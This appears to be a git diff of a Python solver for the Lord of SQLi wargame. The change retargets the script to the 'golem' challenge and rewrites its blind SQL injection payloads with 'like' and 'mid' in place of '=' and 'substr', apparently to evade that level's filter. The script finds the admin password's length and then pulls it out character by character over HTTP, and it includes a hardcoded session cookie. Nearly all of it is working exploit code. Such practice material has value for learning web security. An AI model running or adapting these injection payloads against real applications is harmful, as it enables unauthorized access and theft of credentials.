@@ -2,7 +2,7 @@ import requests
 import string
 
 header = {"Cookie": "PHPSESSID=f0qtti1vj4ignho60h43jjqe12;"}
-url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
+url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
 string_data = string.digits + string.ascii_letters
 
 print(string_data)
@@ -12,7 +12,7 @@ password_len = 1
 
 # find password length
 while True:
-    data = "?pw=' || id='admin' %26%26 length(pw)={}%23".format(str(password_len))
+    data = "?pw=' || id like 'admin' %26%26 length(pw) like {}%23".format(str(password_len))
     response = requests.get(url + data, headers=header)
     if response.text.find("Hello admin") != -1:
         break
@@ -23,10 +23,7 @@ print("[+] Get Password Length : " + str(password_len))
 # find password
 for idx in range(1, password_len + 1):
     for i in string_data:
-        # data = "?pw=' or id='admin' and pw like '{}{}%".format(password,i)
-        # data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
-        data = "?pw=' || id='admin' %26%26 ascii(substr(pw,{},1))={}%23".format(idx,ord(i))
-        # print(data)
+        data = "?pw=' || id like 'admin' %26%26 ascii(mid(pw,{},1)) like {}%23".format(idx,ord(i))
         response = requests.get(url + data, headers=header)
         if response.text.find("Hello admin") != -1:
             password = password + i
